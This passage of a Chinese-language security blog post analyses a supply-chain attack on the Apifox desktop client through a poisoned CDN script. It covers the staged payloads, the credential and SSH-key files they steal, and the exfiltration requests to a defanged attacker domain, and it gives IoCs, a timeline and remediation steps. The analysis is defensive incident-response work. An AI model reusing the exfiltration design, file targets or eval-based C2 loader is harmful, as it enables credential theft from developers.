+<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><code class="hljs plain">POST hxxps://apifox[.]it[.]com/event/0/log<br>Content-Type: text/plain<br>af_uuid: &lt;Stage-2代码中硬编码的机器指纹&gt;<br>Body: &lt;AES-256-GCM 加密数据&gt;<br></code></pre></td></tr></tbody></table></figure>
+
+<h3 id="5-3-Stage-2-v2：纵深窃取（collectAddInformations）">5.3 Stage-2 v2：纵深窃取（collectAddInformations）<a class="post-anchor" href="#5-3-Stage-2-v2：纵深窃取（collectAddInformations）"></a></h3><p>在持续监控中发现 C2 服务器已<strong>升级攻击载荷</strong>（约 4,400 字节），新增了第二轮窃取，上报到不同端点 <code>/event/2/log</code>：</p>
+<table>
+<thead>
+<tr>
+<th>新增窃取目标</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>~/.zshrc</code></td>
+<td>Shell 环境变量（可能含 API Key、Vault 地址、数据库连接串）</td>
+</tr>
+<tr>
+<td><code>~/.npmrc</code></td>
+<td>npm registry 认证 token</td>
+</tr>
+<tr>
+<td><code>~/.kube/*</code></td>
+<td>Kubernetes 集群配置（含 OIDC refresh token、集群 API 地址）</td>
+</tr>
+<tr>
+<td><code>~/.subversion/*</code></td>
+<td>SVN 凭证</td>
+</tr>
+<tr>
+<td>目录树遍历</td>
+<td>主目录、桌面、文档目录结构（深度 1-2 层），Windows 额外扫描 D:\、E:\、F:\</td>
+</tr>
+</tbody></table>
+<p>这表明攻击者在首轮窃取完成后，根据受害者环境<strong>定制后续攻击策略</strong>，逐步扩大窃取范围。</p>
+<h3 id="5-4-关于-Stage-2-代码中的中文注释">5.4 关于 Stage-2 代码中的中文注释<a class="post-anchor" href="#5-4-关于-Stage-2-代码中的中文注释"></a></h3><p>值得注意的是，C2 下发的 Stage-2 攻击载荷——这些由服务端动态生成、RSA 加密传输的”机密”脚本——在解密后竟然保留了<strong>完整的中文开发注释</strong>，例如：</p>
+<figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> salt = <span class="hljs-string">"foxapi"</span>; <span class="hljs-comment">// 盐值也必须提供</span><br><span class="hljs-comment">// scryptSync 会根据密码和盐值，计算出一个确定的 32 字节密钥</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 使用 AES-256-GCM 加密数据</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">const</span> tag = cipher.getAuthTag(); <span class="hljs-comment">// 获取认证标签</span><br><span class="hljs-comment">// 返回格式: IV + AuthTag + EncryptedData (全 Base64)</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 递归读取目录，返回 { "相对路径": "base64内容" }</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 安全读取单个文件，返回 base64 或 null</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 安全执行命令，返回 stdout 或 null</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 收集系统预信息，返回 gzip 压缩后的 base64 字符串（内容为 JSON）</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">// --- 1. 目录结构获取 (Tree) ---</span><br><span class="hljs-comment">// --- 2. 关键文件内容获取 (Files) ---</span><br>path: <span class="hljs-string">"/event/2/log"</span>, <span class="hljs-comment">// 使用 2/log 区分</span><br></code></pre></td></tr></tbody></table></figure>
+
+<p>攻击者在入口文件中精心部署了 7 层混淆、反调试陷阱和 RSA 加密通信，却在服务端下发的实际攻击载荷中留下了如此详尽的中文注释，甚至包括对加密参数的”教学式”说明（如”盐值也必须提供””scryptSync 会根据密码和盐值，计算出一个确定的 32 字节密钥”）。这种前后矛盾的 OPSEC 水平差异耐人寻味——可能暗示入口混淆层和后端载荷并非同一人编写，或者攻击者认为 RSA 加密传输已经足够安全，不必再对载荷本身做处理。</p>
+<h3 id="5-5-未捕获的后续阶段：完整的灵活-C2-平台">5.5 未捕获的后续阶段：完整的灵活 C2 平台<a class="post-anchor" href="#5-5-未捕获的后续阶段：完整的灵活-C2-平台"></a></h3><p><strong>必须强调：目前我们捕获到的 Stage-2 v1 和 v2 仅为前期侦察和凭据采集阶段，并非攻击的终点。</strong></p>
+<p>从架构设计来看，这套恶意软件本质上是一个<strong>完整且高度灵活的远程代码执行（RCE）平台</strong>：</p>
+<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><code class="hljs plain">eval(rsaDecrypt(c2_response))  ←  C2 服务器可以下发任意 JavaScript 代码<br></code></pre></td></tr></tbody></table></figure>
+
+<p>每一次 Apifox 启动后的定时轮询（30 分钟 ~ 3 小时），C2 服务器都可以返回<strong>完全不同的攻击载荷</strong>。我们观测到的 v1（凭据采集）和 v2（纵深窃取）只是攻击者选择在侦察阶段下发的脚本，但该架构完全支持：</p>
+<table>
+<thead>
+<tr>
+<th>潜在后续阶段</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>高价值目标筛选</strong></td>
+<td>根据已回传的 SSH 密钥（目标服务器）、K8s 配置（集群规模）、Git 仓库（代码价值）、Apifox 邮箱（所属公司）等信息，识别金融、加密货币交易所、云服务商等高价值目标</td>
+</tr>
+<tr>
+<td><strong>定制化攻击载荷</strong></td>
+<td>针对筛选出的高价值目标，下发量身定制的脚本——例如针对特定银行内网环境的横向移动工具、针对特定 K8s 集群的持久化后门</td>
+</tr>
+<tr>
+<td><strong>后门植入</strong></td>
+<td>下发独立的持久化后门程序，脱离 Apifox 进程独立运行（概述中已提及”后续攻击者会控制主机拉取执行后门程序”）</td>
+</tr>
+<tr>
+<td><strong>横向移动</strong></td>
+<td>利用窃取的 SSH 密钥直接登录内网服务器，利用 K8s OIDC Token 接管集群</td>
+</tr>
+<tr>
+<td><strong>数据窃取</strong></td>
+<td>针对性地下载源代码、数据库备份、密钥管理系统中的证书</td>
+</tr>
+<tr>
+<td><strong>供应链二次投毒</strong></td>
+<td>利用窃取的 npm Token 或 Git 凭证，向受害者的开源项目注入恶意代码，扩大攻击面</td>
+</tr>
+</tbody></table>
+<p>攻击者的完整作战流程可以理解为：</p>
+<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><code class="hljs plain">广撒网（投毒 CDN）→ 侦察（v1/v2 凭据采集）→ 筛选高价值目标 → 定制化精准打击<br>                     ↑                                              │<br>                     └──── 每次轮询可下发不同指令 ←──────────────────┘<br></code></pre></td></tr></tbody></table></figure>
+
+<p><strong>由于 <code>eval()</code> 可以执行任意代码，且每次轮询返回的载荷可以完全不同，攻击者在凭据采集阶段之后对特定目标执行了哪些操作，目前无法确知。</strong> 受影响用户不能仅因为我们公开的 IoC 中只包含侦察类行为就假定攻击仅止于此——对于被攻击者标记为高价值的目标，后续可能已经遭受了远超凭据窃取的深度入侵。</p>
+<hr>
+<h2 id="六、完整攻击链">六、完整攻击链<a class="post-anchor" href="#六、完整攻击链"></a></h2><figure class="highlight plain"><table><tbody><tr><td class="code"><pre><code class="hljs plain">┌─────────────────────────────────────────────────────────────┐<br>│ 1. Apifox 启动，加载被投毒的 event-tracking.min.js (77KB) │<br>└──────────────────────────┬──────────────────────────────────┘<br>                           ▼<br>┌─────────────────────────────────────────────────────────────┐<br>│ 2. 恶意代码执行:                                           │<br>│    · 采集机器指纹 (MAC+CPU+hostname → SHA-256)              │<br>│    · 窃取 Apifox accessToken，调用官方 API 获取用户邮箱     │<br>│    · RSA-2048 加密敏感数据                                  │<br>└──────────────────────────┬──────────────────────────────────┘<br>                           ▼<br>┌─────────────────────────────────────────────────────────────┐<br>│ 3. 请求 C2: GET /public/apifox-event.js                    │<br>│    Headers: af_uuid, af_os, af_user, af_name...             │<br>│    返回: RSA 加密的 Stage-1 loader (344 bytes)              │<br>└──────────────────────────┬──────────────────────────────────┘<br>                           ▼<br>┌─────────────────────────────────────────────────────────────┐<br>│ 4. RSA 解密 Stage-1，执行 eval():                          │<br>│    动态创建 &lt;script&gt; 标签加载 Stage-2                       │<br>│    路径: /&lt;随机8位hex&gt;.js (一次性URL，用完即404)            │<br>│    加载完毕自动删除 &lt;script&gt; 标签                           │<br>└──────────────────────────┬──────────────────────────────────┘<br>                           ▼<br>┌─────────────────────────────────────────────────────────────┐<br>│ 5. Stage-2 执行 (明文 Node.js):                            │<br>│    v1 - collectPreInformations:                             │<br>│      · ~/.ssh/* (全部密钥)                                  │<br>│      · ~/.zsh_history, ~/.bash_history                      │<br>│      · ~/.git-credentials                                   │<br>│      · ps aux / tasklist                                    │<br>│    v2 - collectAddInformations:                             │<br>│      · ~/.kube/* (K8s 配置)                                 │<br>│      · ~/.zshrc, ~/.npmrc                                   │<br>│      · ~/.subversion/*                                      │<br>│      · 目录树遍历                                           │<br>└──────────────────────────┬──────────────────────────────────┘<br>                           ▼<br>┌─────────────────────────────────────────────────────────────┐<br>│ 6. 数据外泄:                                               │<br>│    JSON → Gzip → AES-256-GCM(key=apifox/foxapi) → Base64   │<br>│    POST /event/0/log  (v1 数据)                             │<br>│    POST /event/2/log  (v2 数据)                             │<br>│    Header: af_uuid = &lt;代码中硬编码的机器指纹&gt;               │<br>└──────────────────────────┬──────────────────────────────────┘<br>                           ▼<br>┌─────────────────────────────────────────────────────────────┐<br>│ 7. 持久化: 30分钟~3小时随机间隔                              │<br>│    ↻ 回到步骤 3，重新请求 C2 获取指令                        │<br>│    ⚠️ 每次轮询 C2 可返回完全不同的载荷                       │<br>└──────────────────────────┬──────────────────────────────────┘<br>                           ▼<br>┌ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┐<br>  8. ⚠️ 未知后续阶段（未捕获，C2 可在任一轮询中切换）:<br>│    · 根据已回传信息筛选高价值目标                             │<br>     · 为特定目标下发定制化攻击脚本<br>│    · 植入独立后门，脱离 Apifox 进程驻留                      │<br>     · SSH 密钥横向移动，渗透内网服务器<br>│    · K8s Token 接管集群，获取生产环境权限                    │<br>     · npm/Git Token 二次供应链投毒<br>│    · 针对特定目标窃取源代码、数据库、证书                    │<br>└ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┘<br></code></pre></td></tr></tbody></table></figure>
+
+<hr>
+<h2 id="七、C2-服务器行为特征">七、C2 服务器行为特征<a class="post-anchor" href="#七、C2-服务器行为特征"></a></h2><p>通过实际交互分析 C2 服务器，发现以下行为特征：</p>
+<table>
+<thead>
+<tr>
+<th>特征</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>服务器技术栈</td>
+<td><code>nginx/1.28.2</code> + <code>Express</code> (Node.js)</td>
+</tr>
+<tr>
+<td>Stage-2 路径动态生成</td>
+<td>每次 Stage-1 请求返回不同的随机 8 位 hex 路径</td>
+</tr>
+<tr>
+<td>一次性 URL</td>
+<td>历史 Stage-2 路径全部返回 404，无法复用</td>
+</tr>
+<tr>
+<td>客户端绑定</td>
+<td><code>af_uuid</code> 从 header 读取后硬编码到 Stage-2 代码中</td>
+</tr>
+<tr>
+<td>CORS 全开</td>
+<td><code>Access-Control-Allow-Origin: *</code></td>
+</tr>
+<tr>
+<td>无缓存</td>
+<td><code>Cache-Control: no-store</code></td>
+</tr>
+<tr>
+<td>攻击载荷迭代</td>
+<td>持续更新 Stage-2 代码（v1 → v2，窃取范围扩大）</td>
+</tr>
+</tbody></table>
+<h3 id="观测到的-Stage-2-URL-样本">观测到的 Stage-2 URL 样本<a class="post-anchor" href="#观测到的-Stage-2-URL-样本"></a></h3><table>
+<thead>
+<tr>
+<th>时间</th>
+<th>Stage-2 路径</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>2026-03-12 10:53</td>
+<td><code>/49b5e0ba.js</code></td>
+</tr>
+<tr>
+<td>2026-03-14 16:19</td>
+<td><code>/69bd75f5.js</code></td>
+</tr>
+<tr>
+<td>2026-03-15 16:33</td>
+<td><code>/bf0475de.js</code></td>
+</tr>
+<tr>
+<td>2026-03-16 04:47</td>
+<td><code>/ad0ff2db.js</code></td>
+</tr>
+<tr>
+<td>2026-03-17 05:35</td>
+<td><code>/185f3323.js</code></td>
+</tr>
+<tr>
+<td>2026-03-18 06:45</td>
+<td><code>/2a44e5af.js</code></td>
+</tr>
+<tr>
+<td>2026-03-18 19:59</td>
+<td><code>/46066214.js</code></td>
+</tr>
+<tr>
+<td>2026-03-19 09:06</td>
+<td><code>/4a8b213c.js</code></td>
+</tr>
+<tr>
+<td>2026-03-19 21:57</td>
+<td><code>/5dc09173.js</code></td>
+</tr>
+<tr>
+<td>2026-03-20 10:44</td>
+<td><code>/8e349a9b.js</code></td>
+</tr>
+</tbody></table>
+<p>以上路径在 2026-03-25 验证时已全部返回 404。</p>
+<hr>
+<h2 id="八、IoCs（攻陷指标）">八、IoCs（攻陷指标）<a class="post-anchor" href="#八、IoCs（攻陷指标）"></a></h2><h3 id="网络指标">网络指标<a class="post-anchor" href="#网络指标"></a></h3><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>指标</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>C2 域名</td>
+<td><code>apifox[.]it[.]com</code>（非标准 ICANN 域名，无 WHOIS）</td>
+</tr>
+<tr>
+<td>域名性质</td>
+<td><code>.it.com</code> 商业二级域名服务，非意大利 ccTLD</td>
+</tr>
+<tr>
+<td>DNS 活跃期</td>
+<td>2026-03-04 至 2026-03-22（18 天）</td>
+</tr>
+<tr>
+<td>投毒入口</td>
+<td><code>hxxps://cdn[.]apifox[.]com/www/assets/js/apifox-app-event-tracking.min.js</code> (77KB 版本)</td>
+</tr>
+<tr>
+<td>Stage-1 URL</td>
+<td><code>hxxps://apifox[.]it[.]com/public/apifox-event.js</code></td>
+</tr>
+<tr>
+<td>Stage-2 URL</td>
+<td><code>hxxps://apifox[.]it[.]com/&lt;随机8位hex&gt;.js</code></td>
+</tr>
+<tr>
+<td>数据外泄端点</td>
+<td><code>hxxps://apifox[.]it[.]com/event/0/log</code>（v1 窃取数据）</td>
+</tr>
+<tr>
+<td>数据外泄端点</td>
+<td><code>hxxps://apifox[.]it[.]com/event/2/log</code>（v2 窃取数据）</td>
+</tr>
+<tr>
+<td>凭证窃取 API</td>
+<td><code>hxxps://api[.]apifox[.]com/api/v1/user</code>（被滥用的合法 API）</td>
+</tr>
+<tr>
+<td>部分反混淆后js/功能js</td>
+<td><a target="_blank" rel="noopener" href="https://gist.github.com/phith0n/7020c55bf241b2f3ccf5254192bd48a5">https://gist.github.com/phith0n/7020c55bf241b2f3ccf5254192bd48a5</a></td>
+</tr>
+</tbody></table>
+<p>部分</p>
+<h3 id="主机指标">主机指标<a class="post-anchor" href="#主机指标"></a></h3><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>指标</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>localStorage 键</td>
+<td><code>_rl_headers</code>、<code>_rl_mc</code></td>
+</tr>
+<tr>
+<td>被读取的凭证</td>
+<td><code>common.accessToken</code></td>
+</tr>
+<tr>
+<td>异常 HTTP 头</td>
+<td><code>af_uuid</code>、<code>af_os</code>、<code>af_user</code>、<code>af_name</code>、<code>af_apifox_user</code>、<code>af_apifox_name</code></td>
+</tr>
+<tr>
+<td>被访问的文件</td>
+<td><code>~/.ssh/*</code>、<code>~/.git-credentials</code>、<code>~/.zsh_history</code>、<code>~/.bash_history</code>、<code>~/.kube/*</code>、<code>~/.npmrc</code>、<code>~/.zshrc</code>、<code>~/.subversion/*</code></td>
+</tr>
+<tr>
+<td>被执行的命令</td>
+<td><code>ps aux</code> (Linux/macOS)、<code>tasklist</code> (Windows)</td>
+</tr>
+</tbody></table>
+<h3 id="加密指标">加密指标<a class="post-anchor" href="#加密指标"></a></h3><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>指标</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>RSA 私钥指纹</td>
+<td>PKCS#8 格式，1703 字符，模数起始 <code>MIIEvQIBADANBgkqh...</code></td>
+</tr>
+<tr>
+<td>AES 密码</td>
+<td><code>apifox</code></td>
+</tr>
+<tr>
+<td>AES 盐值</td>
+<td><code>foxapi</code></td>
+</tr>
+<tr>
+<td>AES 算法</td>
+<td>AES-256-GCM，scryptSync 密钥派生，12 字节 IV</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="九、Wayback-Machine-存档">九、Wayback Machine 存档<a class="post-anchor" href="#九、Wayback-Machine-存档"></a></h2><p>投毒版本的完整代码可在以下 Wayback Machine 存档中获取：</p>
+<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><code class="hljs plain">https://web.archive.org/web/20260305160602/https://cdn.apifox.com/www/assets/js/user-tracking.min.js<br></code></pre></td></tr></tbody></table></figure>
+
+<p>存档时间为 2026 年 3 月 5 日，文件大小 77KB，末尾包含完整的混淆恶意代码。</p>
+<hr>
+<h2 id="十、受影响范围与风险评估">十、受影响范围与风险评估<a class="post-anchor" href="#十、受影响范围与风险评估"></a></h2><h3 id="受影响人群">受影响人群<a class="post-anchor" href="#受影响人群"></a></h3><ul>
+<li>所有在 <strong>2026 年 3 月 4 日之后</strong>启动过 Apifox 桌面端的用户</li>
+<li><strong>全平台受影响</strong>：Windows、macOS、Linux 三个操作系统的用户均在攻击范围内，恶意代码针对不同平台实现了差异化的窃取逻辑（macOS/Linux 读取 <code>.zsh_history</code>、<code>.bash_history</code>、执行 <code>ps aux</code>；Windows 执行 <code>tasklist</code>、额外扫描 D:\E:\F:\ 盘符），不存在”只影响某个平台”的情况</li>
+<li>特别是拥有 SSH 密钥、Git 凭证、K8s 集群权限的高权限用户</li>
+</ul>
+<h3 id="风险等级：🔴-严重（Critical）">风险等级：🔴 严重（Critical）<a class="post-anchor" href="#风险等级：🔴-严重（Critical）"></a></h3><p><strong>已确认的风险（基于已捕获的侦察阶段载荷）：</strong></p>
+<table>
+<thead>
+<tr>
+<th>风险</th>
+<th>影响</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>SSH 私钥泄露</td>
+<td>攻击者可直接登录服务器、跳板机，实施横向移动</td>
+</tr>
+<tr>
+<td>Git 凭证泄露</td>
+<td>源代码仓库被未授权访问，可能引发更大范围的供应链攻击</td>
+</tr>
+<tr>
+<td>Shell 历史泄露</td>
+<td>暴露内部 URL、数据库连接串、API Key、Vault Token 等硬编码敏感信息</td>
+</tr>
+<tr>
+<td>K8s 配置泄露</td>
+<td>集群 OIDC Token / kubeconfig 泄露，可能直接获得生产环境集群管理权限</td>
+</tr>
+<tr>
+<td>npm Token 泄露</td>
+<td>攻击者可向 registry 发布恶意包，扩大供应链攻击面</td>
+</tr>
+<tr>
+<td>Apifox 账户泄露</td>
+<td>攻击者获取用户邮箱和姓名，可用于定向钓鱼或内部社工</td>
+</tr>
+</tbody></table>
+<p><strong>潜在的风险（基于 C2 平台的 RCE 能力，无法排除）：</strong></p>
+<table>
+<thead>
+<tr>
+<th>风险</th>
+<th>影响</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>任意远程代码执行</td>
+<td><code>eval()</code> 可执行 C2 下发的任意脚本，完全控制主机</td>
+</tr>
+<tr>
+<td>定制化深度入侵</td>
+<td>攻击者可根据已回传的凭据，对高价值目标下发量身定制的后续载荷</td>
+</tr>
+<tr>
+<td>独立后门驻留</td>
+<td>可能已植入脱离 Apifox 进程的独立持久化后门</td>
+</tr>
+<tr>
+<td>横向移动</td>
+<td>利用窃取的 SSH 密钥、K8s Token 渗透内网，扩大失陷范围</td>
+</tr>
+<tr>
+<td>二次供应链投毒</td>
+<td>利用窃取的 Git/npm Token 向受害者的开源项目注入恶意代码</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="十一、攻击时间线总览">十一、攻击时间线总览<a class="post-anchor" href="#十一、攻击时间线总览"></a></h2><table>
+<thead>
+<tr>
+<th>日期</th>
+<th>事件</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>2026-03-04</td>
+<td><code>apifox[.]it[.]com</code> DNS 解析上线（Cloudflare 托管），CDN 上的 JS 文件开始被投毒</td>
+</tr>
+<tr>
+<td>2026-03-05</td>
+<td>Wayback Machine 抓取并存档了投毒版本（77KB）</td>
+</tr>
+<tr>
+<td>2026-03-12 ~ 03-20</td>
+<td>观测到至少 10 次不同的 Stage-2 载荷下发（见第七节 URL 样本）</td>
+</tr>
+<tr>
+<td>2026-03-22</td>
+<td><code>apifox[.]it[.]com</code> DNS 记录下线，域名不再解析</td>
+</tr>
+<tr>
+<td>2026-03-25</td>
+<td>CDN 入口文件已被还原为正常版本（34KB），DNS 失效但源站 IP 仍在响应</td>
+</tr>
+</tbody></table>
+<p>攻击活跃窗口：<strong>2026-03-04 至 2026-03-22，共计 18 天</strong>。</p>
+<hr>
+<h2 id="十二、处置建议">十二、处置建议<a class="post-anchor" href="#十二、处置建议"></a></h2><h3 id="紧急措施">紧急措施<a class="post-anchor" href="#紧急措施"></a></h3><ol>
+<li><strong>立即停用</strong> Apifox 桌面端应用</li>
+<li><strong>轮换</strong>所有 SSH 密钥（<code>~/.ssh/</code> 下的全部密钥对）</li>
+<li><strong>吊销</strong>所有 Git Personal Access Token（GitHub、GitLab 等）</li>
+<li><strong>轮换</strong> K8s 集群 OIDC Token 和 kubeconfig</li>
+<li><strong>轮换</strong> npm registry Token</li>
+<li><strong>修改</strong>命令行历史中暴露的所有密码、Token 和 API Key</li>
+<li><strong>审查</strong>服务器登录日志，检查是否有异常 SSH 登录</li>
+</ol>
+<h3 id="检测方法">检测方法<a class="post-anchor" href="#检测方法"></a></h3><ol>
+<li>检查 Electron <code>localStorage</code> 中是否存在 <code>_rl_headers</code>、<code>_rl_mc</code> 键</li>
+<li>监控网络流量中是否有到 <code>apifox[.]it[.]com</code> 的历史请求流量</li>
+<li>检查历史 HTTP 请求头中是否包含 <code>af_uuid</code>、<code>af_os</code> 等异常字段</li>
+</ol>
+<h3 id="长期建议">长期建议<a class="post-anchor" href="#长期建议"></a></h3><ol>
+<li>Apifox 应启用 Electron <code>sandbox</code> 模式，限制渲染进程的 Node.js API 访问</li>
+<li>对加载的远程 JS 文件实施 <strong>Subresource Integrity (SRI)</strong> 校验</li>
+<li>建立 CDN 资源的文件完整性监控机制</li>
+<li>企业用户应对开发工具类软件的网络通信进行审计</li>
+</ol>
+<hr>
+<h2 id="十三、总结">十三、总结<a class="post-anchor" href="#十三、总结"></a></h2><p>这是一起典型的<strong>供应链攻击</strong>，攻击者通过篡改 Apifox CDN 上的合法 JavaScript 文件，在数万开发者的工作电脑上植入后门。攻击设计精巧：</p>
+<ul>
+<li><strong>7 层代码混淆</strong>使静态分析极其困难</li>
+<li><strong>RSA-2048 加密通信</strong>保护 C2 指令不被中间人截获</li>
+<li><strong>一次性 URL</strong> 和 <strong>DOM 自清理</strong>增加取证难度</li>
+<li><strong>AES-256-GCM 加密外泄数据</strong>规避 DLP 检测</li>
+<li><strong>随机间隔持久化</strong>避免产生规律性网络流量</li>
+<li><strong><code>.it.com</code> 非标准域名</strong>规避 WHOIS 追踪，利用视觉欺骗降低怀疑</li>
+</ul>
+<p>然而攻击者也暴露了明显的矛盾——入口文件精心部署了 7 层混淆和反调试陷阱，服务端下发的实际攻击载荷中却留下了详尽的<strong>中文开发注释</strong>，甚至包含”盐值也必须提供””scryptSync 会根据密码和盐值，计算出一个确定的 32 字节密钥”等教学式说明。同时，将 RSA 私钥嵌入客户端代码更是关键失误，使得安全研究人员能够解密全部 C2 通信，完整还原攻击链条并获取实际下发的攻击载荷。</p>
+<p><strong>但必须清醒认识到：本次分析捕获到的 Stage-2 v1/v2 仅为前期侦察和凭据采集阶段。</strong> 该恶意软件的核心本质是一个基于 <code>eval()</code> 的<strong>完整灵活 C2 平台</strong>——C2 服务器在每一次轮询中都可以下发完全不同的任意 JavaScript 代码。攻击者完全有能力根据已回传的机器指纹、Apifox 邮箱（判断所属公司）、SSH 密钥（判断可达服务器）、K8s 配置（判断集群规模和权限）等信息，<strong>筛选出金融机构、加密货币交易所等高价值目标，为其量身定制后续攻击载荷</strong>。</p>
+<p>对于这些被标记为高价值的目标，攻击者在侦察阶段之后可能已经执行了远超凭据窃取的深度入侵——包括但不限于后门植入、横向移动、源代码窃取、生产环境接管。受影响用户切不可因为当前公开的 IoC 仅涵盖侦察行为就低估威胁等级，<strong>应当按照”已失陷”的最高级别进行应急响应</strong>。</p>
+</body></html>
+
+  
+  <div class="post-guide">
+    <div class="item left">
+        
+    </div>
+    <div class="item right">
+        
+          <a href="/2026/01/31/cursor-reverse-notes-1/">Cursor 逆向笔记 1 —— 我是如何拦截解析 Cursor 的 gRPC 通信流量的</a>
+        
+    </div>
+  </div>
+
+  
+
+  <div class="post-copyright">
+    <div class="auth">
+      本文作者：<a href="https://rce.moe">白帽酱</a>
+    </div>
+    <div class="link">
+      永久链接：<a href="https://rce.moe/2026/03/25/apifox-supply-chain-attack-analysis/">https://rce.moe/2026/03/25/apifox-supply-chain-attack-analysis/</a>
+    </div>
+    <div class="declare">
+      版权声明：本文首发于<a href="https://rce.moe">白帽酱</a>的博客，转载请注明出处！
+    </div>
+  </div>
+
+  <div id="comment"></div>
+
+  
+  
+</article>
+<!--<div id="gitalk-container"></div>-->
+<!--<link rel="stylesheet" href="https://unpkg.com/gitalk@latest/dist/gitalk.css">-->
+<!--<script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script>-->
+<!--<script src="https://priesttomb.github.io/js/md5.min.js"></script>-->
+<!--
+<script type="text/javascript">
+    new Gitalk({
+        clientID: '1488ae49eda310270a91',
+        clientSecret: '83e505f36d0351b0ef1a225d089546cb40ecd31a',
+        repo: 'hexoblog',
+        owner: 'burpheart',
+        admin: 'burpheart',
+        id: md5(location.pathname),
+        distractionFreeMode: true,
+        proxy: 'https://servelesscors.rce.moe/api/cors?url=https://github.com/login/oauth/access_token'
+    }).render('gitalk-container')
+-->
+<div id="tcomment"></div>
+<script src="https://cdn.jsdelivr.net/npm/twikoo@1.6.41/dist/twikoo.all.min.js"></script>
+<script>
+twikoo.init({
+  envId: 'https://twikoo.rce.moe', // 腾讯云环境填 envId；Vercel 环境填地址（https://xxx.vercel.app）
+  el: '#tcomment', // 容器元素
+  // region: 'ap-guangzhou', // 环境地域，默认为 ap-shanghai，腾讯云环境填 ap-shanghai 或 ap-guangzhou；Vercel 环境不填
+  // path: location.pathname, // 用于区分不同文章的自定义 js 路径，如果您的文章路径不是 location.pathname，需传此参数
+  // lang: 'zh-CN', // 用于手动设定评论区语言，支持的语言列表 https://github.com/twikoojs/twikoo/blob/main/src/client/utils/i18n/index.js
+})
+</script>
+</script>
+        <footer>
+          <div class="copyright">
+            ©2026
+            <a href="https://rce.moe">白帽酱</a> Powered by <a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a> |
+            <a target="_blank" rel="noopener" href="https://github.com/shixiaohu2206/hexo-theme-huhu">hexo-theme-huhu</a>
+          </div>
+          
+        </footer>
+      </div>
+    </div>
+  </body>
+  
+</html>
+<script type="text/javascript">
+                  window.HUHU_CONFIG = JSON.parse("{\"share\":[\"weibo\",\"weixin\",\"qqkongjian\",\"QQ\",\"douban\",\"facebook\",\"twitter\",\"google\"],\"service_worker\":{\"open\":false}}")
+                </script> <script type="text/javascript">window.addEventListener('load', function() {
+    
+    window.loadJs = function(d, m, a) {
+      var c = document.getElementsByTagName('head')[0] || document.head || document.documentElement
+      var b = document.createElement('script')
+      b.defer = true
+      b.setAttribute('type', 'text/javascript')
+      b.setAttribute('charset', 'UTF-8')
+      b.setAttribute('async', 'true')
+      b.setAttribute('src', d)
+      m && b.setAttribute('data-main', '/scripts/app-built')
+      if (typeof a === 'function') {
+        if (window.attachEvent) {
+          b.onreadystatechange = function() {
+            var e = b.readyState
+            if (e === 'loaded' || e === 'complete') {
+              b.onreadystatechange = null
+              a()
+            }
+          }
+        } else {
+          b.onload = a
+        }
+      }
+      c.appendChild(b)
+    }
+    window.loadJs && window.loadJs('https://cdn.bootcss.com/require.js/2.3.6/require.min.js', true, function() {require.config({"paths":{"util":"util","share":"share","search":"search","pagemap":"pagemap.min","registerSW":"registerSW","valine":"cdn/Valine.min","av":["https://cdn.jsdelivr.net/npm/leancloud-storage/dist/av-min"],"pjax":["https://cdn.bootcss.com/jquery.pjax/2.0.1/jquery.pjax.min"],"jquery":["https://cdn.bootcss.com/jquery/3.4.1/jquery.min"],"confirm":["https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min"],"fancybox":["https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min"],"chart":["https://cdn.bootcss.com/Chart.js/2.8.0-rc.1/Chart.bundle.min"]},"map":{"*":{"css":"https://cdn.bootcss.com/require-css/0.1.10/css.min.js"}},"shim":{"fancybox":{"deps":["css!https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min.css"]},"confirm":{"deps":["css!https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min.css"]},"chart":{"deps":["css!https://cdn.bootcss.com/Chart.js/2.8.0-rc.1/Chart.min.css"]}},"waitSeconds":3})})
+  })</script> <script type="text/javascript">
+                  ;(function() {
+                    var bp = document.createElement('script')
+                    var curProtocol = window.location.protocol.split(':')[0]
+                    if (curProtocol === 'https') {
+                      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js'
+                    } else {
+                      bp.src = 'http://push.zhanzhang.baidu.com/push.js'
+                    }
+                    var s = document.getElementsByTagName('script')[0]
+                    s.parentNode.insertBefore(bp, s)
+                  })()
+                </script> 
